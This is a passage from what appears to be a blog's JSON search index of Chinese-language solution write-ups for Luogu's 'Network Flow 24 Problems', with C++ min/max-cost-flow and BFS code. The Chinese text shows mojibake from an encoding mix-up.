ä»æ¢¯å½¢çš„é¡¶è‡³åº•çš„$m$æ¡è·¯å¾„å…è®¸åœ¨æ•°å­—ç»“ç‚¹ç›¸äº¤æˆ–è¾¹ç›¸äº¤ æ±‚æ¯ç§è§„åˆ™ä¸‹ç»è¿‡æ•°å­—çš„æœ€å¤§æ€»å’Œ é¢˜è§£å¾ˆæ˜æ˜¾æ˜¯ æœ€å¤§è´¹ç”¨æœ€å¤§æµ è§„åˆ™1.è·¯å¾„ä¸ç›¸äº¤,å³æ²¡æœ‰å…¬å…±ç‚¹,ä¹Ÿå°±æ˜¯æ¯ä¸ªç‚¹åªèƒ½ç»è¿‡ä¸€æ¬¡å°†æ¯ä¸ªç‚¹æ‹†æˆå…¥ç‚¹å’Œå‡ºç‚¹,å°±å¯ä»¥é€šè¿‡æ§åˆ¶å‡ºå…¥ç‚¹ä¹‹é—´çš„å®¹é‡æ§åˆ¶ç»è¿‡æ¬¡æ•° ä» æºç‚¹ å‘ ç¬¬ä¸€è¡Œçš„$m$ä¸ªç‚¹çš„å…¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹ ä» æœ€åä¸€è¡Œæ¯ä¸ªç‚¹çš„å‡ºç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹ ä» æ¯ä¸ªç‚¹çš„å…¥ç‚¹ å‘ æ¯ä¸ªç‚¹çš„å‡ºç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸ºè¯¥ç‚¹æ•°å­— çš„è¾¹(å¯¹ç­”æ¡ˆè´¡çŒ®ä¸ºè¯¥ç‚¹æ•°å­—) ä» æ¯ä¸ªç‚¹çš„å‡ºç‚¹ å‘ å·¦ä¸‹å³ä¸‹ä¸¤ä¸ªç‚¹çš„å…¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹ è§„åˆ™2.æ¯æ¡è·¯å¾„ä»…åœ¨æ•°å­—èŠ‚ç‚¹ç›¸äº¤,ä¹Ÿå°±æ˜¯ä¸èƒ½æœ‰é‡è¾¹æ— éœ€æ‹†ç‚¹æ§åˆ¶æ¯ä¸ªç‚¹ç»è¿‡çš„æ¬¡æ•°,åªéœ€ç»™æ¯æ¡å‘å·¦ä¸‹å³ä¸‹çš„è¾¹çš„å®¹é‡è®¾ä¸º$1$,å³åªèƒ½ç»è¿‡ä¸€æ¬¡ ä» æºç‚¹ å‘ ç¬¬ä¸€è¡Œçš„$m$ä¸ªç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹ ä» æœ€åä¸€è¡Œæ¯ä¸ªç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸ºè¯¥ç‚¹æ•°å­— çš„è¾¹(æ¯ä¸ªç‚¹å¯ä»¥ä½¿ç”¨å¤šæ¬¡) ä» æ¯ä¸ªç‚¹çš„ å‘ å·¦ä¸‹å³ä¸‹ä¸¤ä¸ªç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸ºè¯¥ç‚¹æ•°å­— çš„è¾¹ è§„åˆ™3.è¾¹ä¹Ÿå¯ä»¥é‡åˆ,ä¹Ÿå°±ç›¸å½“äºæ²¡æœ‰è§„åˆ™,å¯ä»¥éšæ„å‘å·¦ä¸‹å³ä¸‹èµ°åªéœ€å°†è§„åˆ™2.ä¸­å»ºè¾¹3.çš„å®¹é‡æ”¹æˆ$inf$å³å¯ å¯¹äºæ¯ç§æƒ…å†µ,æ±‚å‡ºæœ€å¤§è´¹ç”¨æœ€å¤§æµ,æœ€å¤§è´¹ç”¨å³ä¸ºç­”æ¡ˆæ³¨æ„æ±‚è§£è§„åˆ™2.3.ä¹‹å‰è¦æ¸…ç©ºå»ºçš„å›¾ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// æœ€å¤§è´¹ç”¨æœ€å¤§æµæ¨¡æ¿éƒ¨åˆ†çœå»äº†int in[45][45];int point[45][45], cnt;int main() { m = read(); n = read(); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= m + i - 1; ++j) { in[i][j] = read(); point[i][j] = ++cnt; } } // Question 1 s = 0; t = cnt * 2 + 1; for (int i = 1; i &lt;= m; ++i) add(s, point[1][i], 1, 0); for (int i = 1; i &lt;= n + m - 1; ++i) add(point[n][i] + cnt, t, 1, 0); for (int i = 1; i &lt;= n; ++i) { if (i &lt; n) for (int j = 1; j &lt;= m + i - 1; ++j) { add(point[i][j] + cnt, point[i + 1][j], 1, 0); add(point[i][j] + cnt, point[i + 1][j + 1], 1, 0); } for (int j = 1; j &lt;= m + i - 1; ++j) add(point[i][j], point[i][j] + cnt, 1, in[i][j]); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); // Question 2 edges.clear(); for (int i = 0; i &lt; maxn; ++i) G[i].clear(); s = 0; t = cnt + 1; for (int i = 1; i &lt;= m; ++i) add(s, point[1][i], 1, 0); for (int i = 1; i &lt;= n + m - 1; ++i) add(point[n][i], t, inf, in[n][i]); for (int i = 1; i &lt; n; ++i) for (int j = 1; j &lt;= m + i - 1; ++j) { add(point[i][j], point[i + 1][j], 1, in[i][j]); add(point[i][j], point[i + 1][j + 1], 1, in[i][j]); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); // Question 3 edges.clear(); for (int i = 0; i &lt; maxn; ++i) G[i].clear(); s = 0; t = cnt + 1; for (int i = 1; i &lt;= m; ++i) add(s, point[1][i], 1, 0); for (int i = 1; i &lt;= n + m - 1; ++i) add(point[n][i], t, inf, in[n][i]); for (int i = 1; i &lt; n; ++i) for (int j = 1; j &lt;= m + i - 1; ++j) { add(point[i][j], point[i + 1][j], inf, in[i][j]); add(point[i][j], point[i + 1][j + 1], inf, in[i][j]); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/86b4c1f9.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æ·±æµ·æœºå™¨äººé—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4012ã€æ·±æµ·æœºå™¨äººé—®é¢˜ é¢˜ç›®å¤§æ„ä¸€ä¸ª$P\\times Q$ç½‘æ ¼,æœºå™¨äººå¯ä»¥å‘åŒ—/ä¸œèµ°,è¥¿å—ä¸º$(0, 0)$,ä¸œåŒ—ä¸º$(Q, P)$æ¯ä¸ªç½‘æ ¼è¾¹ä¸Šæœ‰ç”Ÿç‰©æ ‡æœ¬,å’Œä»·å€¼æœ‰$a$ä¸ªèµ·ç‚¹,æ¯ä¸ªèµ·ç‚¹æœ‰ä¸åŒçš„æœºå™¨äººä¸ªæ•°æœ‰$b$ä¸ªç»ˆç‚¹,æ¯ä¸ªç»ˆç‚¹æœ‰ä¸åŒçš„æœºå™¨äººä¸ªæ•°ä½œä¸ºç›®çš„åœ° æ±‚é‡‡é›†åˆ°ç”Ÿç‰©æ ‡æœ¬çš„æœ€é«˜æ€»ä»·å€¼ é¢˜è§£æœ€å¤§è´¹ç”¨æœ€å¤§æµ æ¯ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´å»ºä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸ºæ ‡æœ¬ä»·å€¼ çš„è¾¹,å’Œä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$0$ çš„è¾¹(æ ‡æœ¬åªèƒ½é‡‡é›†ä¸€æ¬¡) ä» æºç‚¹ å‘ æ¯ä¸ªèµ·ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸ºæœºå™¨äººä¸ªæ•°,è´¹ç”¨ä¸º$0$ çš„è¾¹ ä» æ¯ä¸ªç»ˆç‚¹ å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸ºæœºå™¨äººä¸ªæ•°,è´¹ç”¨ä¸º$0$ çš„è¾¹ è·‘å‡ºæœ€å¤§è´¹ç”¨æœ€å¤§æµ,æœ€å¤§è´¹ç”¨å³ä¸ºç»“æœ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 410;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &lt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MaxCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}int p_, q_;int point(int x, int y) { return (x - 1) * q_ + y;}int main() { int a_ = read(), b_ = read(); p_ = read() + 1; q_ = read() + 1; s = 0, t = p_ * q_ + 1; for (int i = 1; i &lt;= p_; ++i) { for (int j = 1; j &lt; q_; ++j) { int w = read(); add(point(i, j), point(i, j + 1), 1, w); add(point(i, j), point(i, j + 1), inf, 0); } } for (int i = 1; i &lt;= q_; ++i) { for (int j = 1; j &lt; p_; ++j) { int w = read(); add(point(j, i), point(j + 1, i), 1, w); add(point(j, i), point(j + 1, i), inf, 0); } } for (int i = 1; i &lt;= a_; ++i) { int k = read(), x = read() + 1, y = read() + 1; add(s, point(x, y), k, 0); } for (int i = 1; i &lt;= b_; ++i) { int r = read(), x = read() + 1, y = read() + 1; add(point(x, y), t, r, 0); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%d\\n&quot;, anscost); return 0;}","link":"/p/cfb1d422.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€å­¤å²›è¥æ•‘é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4011ã€å­¤å²›è¥æ•‘é—®é¢˜ é¢˜ç›®å¤§æ„èµ·ç‚¹ä¸º$(1,1)$,ç»ˆç‚¹ä¸º$(n,m)$æœ‰äº›æ ¼å­ä¸Šæœ‰è‹¥å¹²ä¸ªé’¥åŒ™ï¼Œä¸¤ä¸ªæ ¼å­ä¹‹é—´å¯èƒ½æœ‰ä¸€å µå¢™æˆ–è€…ä¸€æ‰‡å¯ä»¥ç”¨å¯¹åº”é’¥åŒ™æ‰“å¼€çš„é—¨æ¯æ¬¡ç§»åŠ¨éœ€è¦$1$ä¸ªå•ä½æ—¶é—´ï¼Œå…¶ä»–åŠ¨ä½œä¸éœ€è¦æ—¶é—´ æ±‚æœ€å°‘éœ€è¦å¤šå°‘æ—¶é—´èƒ½ä»èµ·ç‚¹åˆ°è¾¾ç»ˆç‚¹ã€‚ é¢˜è§£å¯¹æ‹¥æœ‰çš„é’¥åŒ™çŠ¶æ€è¿›è¡Œå‹ç¼©ä»èµ·ç‚¹åˆ°ç»ˆç‚¹è·‘bfså³å¯ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 20;const int go[4][2] = {{1, 0}, {-1, 0}, {0, 1}, {0, -1}};int n, m, p, k;int cnt[maxn][maxn], key[maxn][maxn][maxn];bool vis[maxn][maxn][1 &lt;&lt; 15];int edge[maxn][maxn][maxn][maxn];struct Node { int x, y; int keys, times; Node(int x, int y, int k, int t): x(x), y(y), keys(k), times(t) {}};queue&lt;Node&gt; q;int bfs() { int skey = 0; for (int i = 1; i &lt;= cnt[1][1]; ++i) skey |= (1 &lt;&lt; (key[1][1][i] - 1)); q.push(Node(1, 1, skey, 0)); vis[1][1][skey] = true; while (!q.empty()) { Node u = q.front(); q.pop(); if (u.x == n &amp;&amp; u.y == m) return u.times; for (int k = 0; k &lt; 4; ++k) { int vx = u.x + go[k][0], vy = u.y + go[k][1]; if (vx &lt; 1 || vx &gt; n || vy &lt; 1 || vy &gt; m) continue; int e = edge[u.x][u.y][vx][vy]; if (e &lt; 0 || (e &gt; 0 &amp;&amp; !(1 &lt;&lt; (e - 1) &amp; u.keys))) continue; int vkeys = 0; for (int i = 1; i &lt;= cnt[vx][vy]; ++i) vkeys |= (1 &lt;&lt; (key[vx][vy][i] - 1)); int nxtkeys = u.keys | vkeys; if (vis[vx][vy][nxtkeys]) continue; q.push(Node(vx, vy, nxtkeys, u.times + 1)); vis[vx][vy][nxtkeys] = true; } } return -1;}int main() { n = read(); m = read(); p = read(); k = read(); for (int i = 1; i &lt;= k; ++i) { int x1 = read(), y1 = read(), x2 = read(), y2 = read(); int g = read(); edge[x1][y1][x2][y2] = ((g == 0) ? -1 : g); edge[x2][y2][x1][y1] = edge[x1][y1][x2][y2]; } int s = read(); for (int i = 1; i &lt;= s; ++i) { int x1 = read(), y1 = read(), q = read(); key[x1][y1][++cnt[x1][y1]] = q; } int ans = bfs(); printf(&quot;%d\\n&quot;, ans); return 0;}","link":"/p/5c532c45.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æ±½è½¦åŠ æ²¹è¡Œé©¶é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4009ã€æ±½è½¦åŠ æ²¹è¡Œé©¶é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å‡ºä¸€ä¸ª$N\\times N$çš„ç½‘æ ¼,è¡¨ç¤ºæœ‰åŠ æ²¹ç«™çš„ä½ç½®æ±½è½¦è¦ä»$(1, 1)$èµ°åˆ°$(N, N)$,è£…æ»¡æ²¹å¯ä»¥è¡Œé©¶$K$æ¡è¾¹,ä¸”åªèƒ½æ²¿è¾¹è¡Œé©¶æœä»ä»¥ä¸‹è§„åˆ™ å¯ä»¥æ— è´¹ç”¨å‘å³æˆ–å‘ä¸‹èµ°,ä½†è€—1ç‚¹æ²¹ å‘å·¦èµ°æˆ–è€…å‘ä¸Šèµ°æ—¶éœ€è¦ä»˜è´¹ç”¨$B$,å¹¶è€—1ç‚¹æ²¹ åœ¨åŠ æ²¹ç«™å¤„,è‹¥æ²¹æ²¡æ»¡,åˆ™å¿…é¡»ä»˜è´¹ç”¨$A$,åŠ æ»¡æ²¹ å¯åœ¨æ²¡æœ‰åŠ æ²¹ç«™çš„ä½ç½®å¼€è®¾åŠ æ²¹ç«™,è´¹ç”¨$C$,å¹¶åŠ æ»¡æ²¹,ä»˜è´¹$A$ åœ¨èµ·ç‚¹å¤„,æ²¹é‡ä¸º$K$ æ±‚å‡ºæœ€å°è´¹ç”¨ é¢˜è§£æ˜æ˜¾æ˜¯æœ€å°è´¹ç”¨æœ€å¤§æµ(å…¶å®åˆ†å±‚å›¾æœ€çŸ­è·¯ä¹Ÿå¯ä»¥è§£å†³,å› ä¸ºæ¯æ¡è¾¹çš„å®¹é‡éƒ½ä¸º1)åˆ†å±‚å»ºå›¾,æ¯å±‚è¡¨ç¤ºæ²¹é‡,ç¬¬$0$å±‚è¡¨ç¤ºæ»¡æ²¹($K$),ç¬¬$1$å±‚è¡¨ç¤ºæ²¹é‡ä¸º$K-1$,ç¬¬$2$å±‚è¡¨ç¤ºæ²¹é‡ä¸º$K-2$,$â€¦$ å¯¹äºæ¯å±‚æ¯ä¸ªèŠ‚ç‚¹,å¦‚æœä¸æ˜¯åŠ æ²¹ç«™,åˆ™ä» è¯¥ç‚¹ å‘ ä¸‹ä¸€å±‚çš„å³è¾¹å’Œä¸‹è¾¹çš„èŠ‚ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹(è§„åˆ™1.) å¯¹äºæ¯å±‚æ¯ä¸ªèŠ‚ç‚¹,å¦‚æœä¸æ˜¯åŠ æ²¹ç«™,åˆ™ä» è¯¥ç‚¹ å‘ ä¸‹ä¸€å±‚çš„å·¦è¾¹å’Œä¸Šè¾¹çš„èŠ‚ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$B$ çš„è¾¹(è§„åˆ™2.) å¯¹äºæ¯ä¸ªèŠ‚ç‚¹,å¦‚æœæ˜¯åŠ æ²¹ç«™,åˆ™ä» ç¬¬$0$å±‚çš„è¯¥ç‚¹ æŒ‰ç…§ä¸Šä¸¤æ¡å»ºè¾¹ å¯¹äºæ¯ä¸ªèŠ‚ç‚¹,å¦‚æœæ˜¯åŠ æ²¹ç«™,åˆ™ä» é™¤$0$å±‚å¤–çš„æ¯å±‚èŠ‚ç‚¹ å‘ ç¬¬$0$å±‚çš„è¯¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$A$ çš„è¾¹(è§„åˆ™3.) å¯¹äºæ¯ä¸ªèŠ‚ç‚¹,å¦‚æœä¸æ˜¯åŠ æ²¹ç«™,åˆ™ä» ç¬¬$K$å±‚çš„è¯¥ç‚¹ å‘ ç¬¬$0$å±‚çš„è¯¥ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$A+C$ çš„è¾¹(è§„åˆ™4.) ä» æºç‚¹ å‘ ç¬¬$0$å±‚çš„$(1, 1)$èŠ‚ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹ ä» æ¯å±‚çš„$(N, N)$èŠ‚ç‚¹ å‘ æ±‡ç‚¹ æ¥ä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹(åˆ°ç»ˆç‚¹ä¸è€ƒè™‘æ²¹é‡) æ±‚å‡ºæœ€å°è´¹ç”¨æœ€å¤§æµå³å¯ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 200010;const int inf = 0x3f3f3f3f;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0x3f, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &gt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == inf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MinCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}int N, K, A, B, C;int in[110][110];int point(int x, int y, int dep) { return (x - 1) * N + y + dep * N * N;}int main() { N = read(); K = read(); A = read(); B = read(); C = read(); s = 0; n = (K + 1) * N * N; t = n + 1; for (int i = 1; i &lt;= N; ++i) for (int j = 1; j &lt;= N; ++j) { in[i][j] = read(); if (in[i][j]) { for (int k = 1; k &lt;= K; ++k) { add(point(i, j, k), point(i, j, 0), 1, A); } } for (int k = 0; k &lt; K; ++k) { if (in[i][j] &amp;&amp; k) break; if (i + 1 &lt;= N) add(point(i, j, k), point(i + 1, j, k + 1), 1, 0); if (j + 1 &lt;= N) add(point(i, j, k), point(i, j + 1, k + 1), 1, 0); if (i - 1 &gt;= 1) add(point(i, j, k), point(i - 1, j, k + 1), 1, B); if (j - 1 &gt;= 1) add(point(i, j, k), point(i, j - 1, k + 1), 1, B); } if (!in[i][j]) add(point(i, j, K), point(i, j, 0), 1, A + C); } add(s, point(1, 1, 0), 1, 0); for (int k = 0; k &lt;= K; ++k) { add(point(N, N, k), t, 1, 0); } ansflow = MinCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/fab3e888.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æœ€é•¿kå¯é‡çº¿æ®µé›†é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P3357ã€æœ€é•¿kå¯é‡çº¿æ®µé›†é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å®šä¸€ä¸ªå¼€çº¿æ®µçš„é›†åˆ$\\mathbf{I}$,ä»$\\mathbf{I}$ä¸­å–å‡ºä¸€äº›å¼€çº¿æ®µ,ç»„æˆé›†åˆ$\\mathbf{S}$ä½¿å¯¹äºä»»ä½•ä¸€æ¡ç›´çº¿$x=p$,æ»¡è¶³$\\mathbf{S}$ä¸­ä¸$x=p$ç›¸äº¤çš„çº¿æ®µæ•°ä¸è¶…è¿‡$k$,ä¸”$\\mathbf{S}$ä¸­å¼€çº¿æ®µæ€»é•¿åº¦æœ€å¤§ æ±‚æœ€å¤§çš„é•¿åº¦ é¢˜è§£å’Œã€ŒLuogu P3358ã€æœ€é•¿kå¯é‡åŒºé—´é›†é—®é¢˜ç±»ä¼¼ä»…ä¿®æ”¹ä¸€ä¸‹åŒºé—´çš„è¾“å…¥éƒ¨åˆ†å³å¯ å°†æ¯æ¡çº¿æ®µæ˜ å°„åˆ°xè½´ä¸Š,å‘ç°å¯èƒ½ä¸å¯¹,å› ä¸ºå¯èƒ½ä¼šå­˜åœ¨å‚ç›´äºxè½´çš„çº¿æ®µ,åƒP3358ä¸€æ ·å»ºå›¾ä¼šçœç•¥æ‰è¿™æ¡çº¿æ®µ æ‰€ä»¥è¦å°†æ¯ä¸ªç‚¹æ‰©å¤§ä¸€å€,å°†å·¦å³ç«¯ç‚¹xåæ ‡ç›¸åŒçš„åŒºé—´$(x, x)$æ›´æ”¹ä¸º$(2x, 2x+1)$,ä½¿å¾—ä¸å­˜åœ¨ä¸xè½´å‚ç›´çš„çº¿æ®µå¦‚æœå·¦å³ç«¯ç‚¹xåæ ‡ä¸ç›¸åŒ,åˆ™å°†$(x_1, x_2)$æ›´æ”¹ä¸º$(2x_1+1, 2x_2)$ å¤§æ¦‚å°±æ˜¯è¿™ä¹ˆä¸ªé“ç†: å‰©ä¸‹çš„åšæ³•å’ŒP3358ä¸€æ ·,P3358é¢˜è§£ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 2010;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &lt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MaxCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}struct Interval { int l, r, len;}inter[510];int nums[1020], old[1020];int length(int a, int b, int c, int d) { return (int)sqrt((long long)(a - c) * (a - c) + (long long)(b - d) * (b - d));}int main() { int n_ = read(), k = read(); for (int i = 1; i &lt;= n_; ++i) { int a = read(), b = read(), c = read(), d = read(); inter[i].len = length(a, b, c, d); inter[i].l = a * 2; inter[i].r = c * 2; if (a == c) inter[i].r += 1; else inter[i].l += 1; nums[i * 2 - 1] = inter[i].l; nums[i * 2] = inter[i].r; } for (int i = 1; i &lt;= n_ * 2; ++i) old[i] = nums[i]; sort(old + 1, old + 1 + n_ * 2); int len = unique(old + 1, old + 1 + n_ * 2) - old - 1; for (int i = 1; i &lt;= n_ * 2; ++i) nums[i] = lower_bound(old + 1, old + 1 + len, nums[i]) - old; for (int i = 1; i &lt;= n_; ++i) { inter[i].l = nums[i * 2 - 1]; inter[i].r = nums[i * 2]; } s = 0; n = len + 2; t = n - 1; add(s, 1, k, 0); for (int i = 1; i &lt;= len; ++i) { add(i, i + 1, inf, 0); } for (int i = 1; i &lt;= n_; ++i) { add(inter[i].l, inter[i].r, 1, inter[i].len); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%d\\n&quot;, anscost); return 0;}","link":"/p/f48af49a.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æœ€é•¿kå¯é‡åŒºé—´é›†é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P3358ã€æœ€é•¿kå¯é‡åŒºé—´é›†é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å®šä¸€ä¸ªå¼€åŒºé—´çš„é›†åˆ$\\mathbf{I}$,ä»$\\mathbf{I}$ä¸­å–å‡ºä¸€äº›å¼€åŒºé—´,ç»„æˆé›†åˆ$\\mathbf{S}$ä½¿å¯¹äºä»»ä½•ä¸€ä¸ª$x$,æ»¡è¶³$\\mathbf{S}$ä¸­åŒ…å«$x$çš„åŒºé—´æ•°ä¸è¶…è¿‡$k$,ä¸”$\\mathbf{S}$ä¸­å¼€åŒºé—´æ€»é•¿åº¦æœ€å¤§ æ±‚æœ€å¤§çš„é•¿åº¦ é¢˜è§£å¦‚æœä¸¤ä¸ªåŒºé—´æ²¡æœ‰é‡å çš„è¯,åˆ™å¯ä»¥åŒæ—¶é€‰æ‹©,åœ¨å›¾ä¸Šè¡¨ç°ä¸ºä¸²è”å¦‚æœä¸¤ä¸ªåŒºé—´æœ‰é‡å çš„è¯,åˆ™ä¸èƒ½åŒæ—¶é€‰æ‹©,åœ¨å›¾ä¸Šè¡¨ç°ä¸ºå¹¶è”(æœä»æ€»æµé‡çš„çº¦æŸ)å…ˆå¯¹æ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œç¦»æ•£åŒ–,æ³¨æ„ç¦»æ•£åŒ–å‰ç»Ÿè®¡å‡ºåŒºé—´çš„é•¿ ä» 